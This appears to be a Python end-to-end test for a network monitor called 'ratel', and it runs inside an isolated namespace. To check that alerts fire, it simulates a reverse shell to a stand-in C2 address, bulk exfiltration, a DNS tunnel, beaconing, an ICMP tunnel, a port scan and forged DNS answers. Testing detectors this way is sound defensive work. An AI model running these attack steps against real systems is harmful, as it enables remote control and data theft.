#!/usr/bin/env python3
"""End-to-end test of `ratel watch` on real traffic, without root.

Run via: unshare -rn python3 train/net/sandbox_test.py
Inside a fresh user+network namespace only `lo` exists and we are "root" for it,
so packet capture and socket-destroy events work. Test addresses are put on lo:
the traffic never leaves the namespace. Scenarios: bulk upload to a new host,
DNS tunnel, beaconing, reverse shell, ICMP tunnel, port scan, plus benign
traffic that must NOT alert (a download, normal DNS, a few web-like requests).
"""
import json, os, shutil, socket, subprocess, sys, threading, time

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
RATEL = os.environ.get("RATEL_BIN") or os.path.join(ROOT, "target", "release", "ratel")
SINK, C2, DNS, PINGT, WEB = "203.0.113.9", "198.51.100.7", "10.53.53.53", "192.0.2.10", "192.0.2.80"
ROGUE = "198.51.100.53"  # an attacker's own DNS server

def sh(*a):
    subprocess.run(a, check=True)

sh("ip", "link", "set", "lo", "up")
ME = "10.0.0.2"  # "this host": clients connect from here, so server-side sockets look private
for a in (SINK, C2, DNS, PINGT, WEB, ME, ROGUE):
    sh("ip", "addr", "add", a + "/32", "dev", "lo")

def server(host, port, handler):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port)); s.listen(64)
    def loop():
        while True:
            c, _ = s.accept()
            threading.Thread(target=handler, args=(c,), daemon=True).start()
    threading.Thread(target=loop, daemon=True).start()

def sink(c):
    while c.recv(1 << 16): pass
    c.close()

def web(c):
    c.recv(4096); c.sendall(b"x" * 200_000); c.close()

def c2(c):
    c.sendall(b"sleep 20; exit\n"); time.sleep(25); c.close()

server(SINK, 8443, sink)
server(WEB, 443, web)
server(C2, 4444, c2)

def resolver():
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.bind((DNS, 53))
    while True:
        q, a = u.recvfrom(2048)
        r = bytearray(q); r[2] |= 0x80; r[3] = (r[3] & 0xF0) | 3  # NXDOMAIN
        u.sendto(bytes(r), a)
threading.Thread(target=resolver, daemon=True).start()

def rogue_resolver():
    # answers every A query with the exfil sink's address
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.bind((ROGUE, 53))
    while True:
        q, a = u.recvfrom(2048)
        r = bytearray(q); r[2] |= 0x80; r[3] = 0x80; r[7] = 1
        r += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + bytes(int(x) for x in SINK.split("."))
        u.sendto(bytes(r), a)
threading.Thread(target=rogue_resolver, daemon=True).start()

_orig_cc = socket.create_connection
def cc(addr, timeout=None):
    return _orig_cc(addr, timeout=timeout, source_address=(ME, 0))
socket.create_connection = cc

def dnsq(name, qtype=1, server=DNS):
    q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.settimeout(1); u.bind((ME, 0))
    u.sendto(q, (server, 53))
    try: u.recv(2048)
    except OSError: pass
    u.close()

# fake notify socket (protocol from ~/Projects/notify-sdk): prints nothing, collects messages
NOTIFY = "/tmp/ratel-sbx-notify.sock"
if os.path.exists(NOTIFY): os.remove(NOTIFY)
received = []
def notify_server():
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); srv.bind(NOTIFY); srv.listen()
    while True:
        c, _ = srv.accept(); data = b""
        while chunk := c.recv(65536): data += chunk
        c.close(); received.append(data.decode("utf-8", "replace"))
threading.Thread(target=notify_server, daemon=True).start()
# a folder for the periodic static scan, with one synthetic sample that scores high
SCAN = "/tmp/ratel-sbx-scan"
os.makedirs(SCAN, exist_ok=True)
import shutil, hashlib; shutil.copy(os.path.join(ROOT, "data/synth/bin/s1_000066"), SCAN + "/dropper")
# ---- signature response: a test signature database (no real malware involved).
# The EICAR test file goes into the scanned folder; a copy of the Python binary is
# "known malware" by its hash, and runs beaconing to the C2 address.
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
for f in os.listdir(SCAN):
    if f != "dropper": os.remove(os.path.join(SCAN, f))
with open(SCAN + "/eicar.com", "wb") as fh: fh.write(EICAR)
BIN = "/tmp/ratel-sbx-bin"; shutil.rmtree(BIN, ignore_errors=True); os.makedirs(BIN)
PYX = BIN + "/pyx"; shutil.copy(os.path.realpath(sys.executable), PYX)
with open(PYX, "ab") as fh: fh.write(b"\0ratel-test-sample")  # its own hash: not the interpreter running this test
SIGS = "/tmp/ratel-sbx-sigs"; shutil.rmtree(SIGS, ignore_errors=True); os.makedirs(SIGS); os.chmod(SIGS, 0o755)
pyx = open(PYX, "rb").read()
with open(SIGS + "/test.hdb", "w") as fh: fh.write(f"{hashlib.md5(EICAR).hexdigest()}:{len(EICAR)}:Eicar-Test-Signature\n")
with open(SIGS + "/test.hsb", "w") as fh: fh.write(f"{hashlib.sha256(pyx).hexdigest()}:{len(pyx)}:Ratel.Test.RunningMalware\n")
for f in os.listdir(SIGS): os.chmod(os.path.join(SIGS, f), 0o644)

state = "/tmp/ratel-sbx-state"
os.makedirs(state, exist_ok=True)
shutil.rmtree(state, ignore_errors=True); os.makedirs(state)
w = subprocess.Popen([RATEL, "watch", "--loopback", "--resolver", DNS, "--learn-hours", "0", "--json", "--duration", "200",
                      "--state", state, "--interval", "1", "--clamav-db", SIGS, "--record", "/tmp/ratel-sbx-events.jsonl",
                      "--log", "/tmp/ratel-sbx-alerts.jsonl", "--scan-path", SCAN, "--scan-every", "1"],
                     stdout=subprocess.PIPE, text=True, env=dict(os.environ, NOTIFY_SOCKET=NOTIFY))
time.sleep(3)

# ---- benign
for i in range(5):
    dnsq(f"www{i}.example.org")
    s = socket.create_connection((WEB, 443)); s.sendall(b"GET / HTTP/1.1\r\n\r\n")
    while s.recv(65536): pass
    s.close()
# ---- "known malware" running and talking to the C2 host
mal = subprocess.Popen([PYX, "-c", "import socket,time\nfor i in range(40):\n    try:\n        s=socket.create_connection(('%s',4444),timeout=2,source_address=('%s',0)); s.sendall(b'x'); time.sleep(3); s.close()\n    except OSError: pass\n    time.sleep(1)" % (C2, ME)])
# ---- forged DNS answer (no query was sent) claiming the exfil sink is github.com:
# the monitor must not believe it (the upload must still be to "an address no DNS lookup returned")
fake = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
fake.bind((DNS, 5353))
ans = (b"\x77\x77\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" + b"\x06github\x03com\x00\x00\x01\x00\x01"
       + b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + bytes(int(x) for x in SINK.split(".")))
for port in (33333, 44444, 55555):
    fake.sendto(ans, (ME, port))  # from port 5353: also send one from 53 below
fake.close()
fake53 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); fake53.bind((DNS, 0))
# a real resolver socket on :53 exists (the fake resolver thread); craft from it instead via raw send
for port in (33333, 44444):
    try:
        u2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        u2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        u2.bind((DNS, 53)); u2.sendto(ans, (ME, port)); u2.close()
    except OSError:
        pass
fake53.close()
# ---- a real answer, but from the attacker's own DNS server (asked directly): matched, not believed
dnsq("github.com", server=ROGUE)
# ---- bulk exfil: 80 MB to a never-seen host, odd port
s = socket.create_connection((SINK, 8443)); buf = os.urandom(1 << 20)
for _ in range(80):
    s.sendall(buf); time.sleep(0.12)
s.close()
# ---- DNS tunnel: 60 queries with long random labels, TXT
for i in range(60):
    dnsq(os.urandom(20).hex() + "." + os.urandom(6).hex() + ".t.tunnel-test.net", 16)
    time.sleep(0.05)
# ---- reverse shell: sh with stdin/stdout on a socket to the "C2"
rs = socket.create_connection((C2, 4444))
shp = subprocess.Popen(["sh"], stdin=rs.fileno(), stdout=rs.fileno(), stderr=subprocess.DEVNULL)
# ---- ICMP tunnel-like: big echo payloads
subprocess.Popen(["ping", "-q", "-I", ME, "-s", "900", "-i", "0.2", "-c", "60", PINGT], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
# ---- port scan: 150 ports in a few seconds
for p in range(20000, 20150):
    try:
        x = socket.create_connection((SINK, p), timeout=0.2); x.close()
    except OSError: pass
# ---- a compromised dashboard plants suppressions: the daemon must announce the valid one
# and reject the catch-all wildcard (both visible as health alerts)
os.makedirs(state + "/feedback.d", exist_ok=True)
with open(state + "/feedback.d/web.jsonl", "w") as fh:
    fh.write(json.dumps({"id": "x", "fp": True, "suppress": [["/usr/bin/planted", "203.0.113.77", "exfil"],
                                                             ["unattributed", "*", "scan"]]}) + "\n")
# ---- beacon: every 6 s, small check-in
for i in range(12):
    try:
        b = socket.create_connection((C2, 4444), timeout=2); b.sendall(b"hi"); b.close()
    except OSError: pass
    time.sleep(5.5)

time.sleep(30)
st = subprocess.run([RATEL, "status", "--state", state], capture_output=True, text=True)
print("--- ratel status (while running):\n" + st.stdout + st.stderr)
out, _ = w.communicate()
alerts = [json.loads(l) for l in out.splitlines() if l.startswith("{")]
for a in alerts:
    print(f"{a['severity']:6s} {a['kind']:8s} {a['title']}")
    for e in a["evidence"]: print("        -", e)
time.sleep(1)
al = subprocess.run([RATEL, "alerts", "--log", "/tmp/ratel-sbx-alerts.jsonl", "--min", "medium"], capture_output=True, text=True)
print("--- ratel alerts:\n" + al.stdout + al.stderr)
inc = sorted(f[:-6] for f in os.listdir(state + "/incidents"))
def holds(i, kind):  # incidents group related alerts: look inside, not at the file name
    with open(f"{state}/incidents/{i}.jsonl") as fh:
        return any(json.loads(l).get("alert", {}).get("kind") == kind for l in fh if l.strip())
exf = [i for i in inc if holds(i, "exfil")]
if exf:
    ex = subprocess.run([RATEL, "explain", exf[0], "--state", state], capture_output=True, text=True)
    print("--- ratel explain " + exf[0] + ":\n" + ex.stdout + ex.stderr)
bea = [i for i in inc if holds(i, "beacon")]
if bea:
    ak = subprocess.run([RATEL, "ack", bea[0], "--fp", "--note", "test", "--state", state], capture_output=True, text=True)
    print("--- ratel ack --fp:\n" + ak.stdout + ak.stderr)
print(f"--- {len(received)} XMPP message(s) via the notify socket; first one:")
print(received[0] if received else "(none)")
kinds = {a["kind"] for a in alerts}
want = {"exfil", "dns", "process", "icmp", "scan", "beacon", "file", "health"}
# signature response: EICAR quarantined from the scan folder; the running "malware"
# frozen (SIGSTOP here: no cgroup delegation in a user namespace) and quarantined
fa = [a for a in alerts if a["kind"] == "file" and "ClamAV: Eicar" in a["title"]]
ra = [a for a in alerts if "running malware" in a["title"]]
eicar_q = bool(fa) and any(e.startswith("quarantined as") for e in fa[0]["evidence"]) and not os.path.exists(SCAN + "/eicar.com")
mal_frozen = bool(ra) and any(e.startswith("process tree frozen") for e in ra[0]["evidence"])
mal_q = bool(ra) and any(e.startswith("quarantined as") for e in ra[0]["evidence"]) and not os.path.exists(PYX)
print("signature response: EICAR quarantined", eicar_q, "| running malware frozen", mal_frozen, "and quarantined", mal_q)
for a in fa[:1] + ra[:1]:
    print("   ", a["title"]); [print("       -", e) for e in a["evidence"]]
try: mal.kill()
except Exception: pass
contained = subprocess.run([RATEL, "contain", "list", "--state", state + "/contained.json"], capture_output=True, text=True)
print("--- ratel contain list:\n" + contained.stdout + contained.stderr)
health = [a for a in alerts if a["kind"] == "health"]
print("--- health alerts:", [(a["title"], a["evidence"][:2]) for a in health])
announced = any("suppression" in a["title"] and any("/usr/bin/planted" in e for e in a["evidence"]) for a in health)
rejected = any("feedback inbox" in a["title"] and any("rejected suppression" in e for e in a["evidence"]) for a in health)
print("suppression announced:", announced, "| catch-all wildcard rejected:", rejected)
exf_alert = [a for a in alerts if a["kind"] == "exfil" and SINK in a["dest"]]
spoof_ok = bool(exf_alert) and "github" not in exf_alert[0]["dest"] and any("no DNS lookup returned" in e for e in exf_alert[0]["evidence"])
print("forged DNS answer ignored:", spoof_ok, exf_alert[0]["dest"] if exf_alert else None)
bad = [a for a in alerts if WEB in a["dest"] or "example.org" in a["dest"]]
print("missing:", sorted(want - kinds) or "none", "| false alerts on benign:", len(bad))
sys.exit(0 if want <= kinds and not bad and received and exf and announced and rejected and spoof_ok and eicar_q and mal_frozen and mal_q else 1)
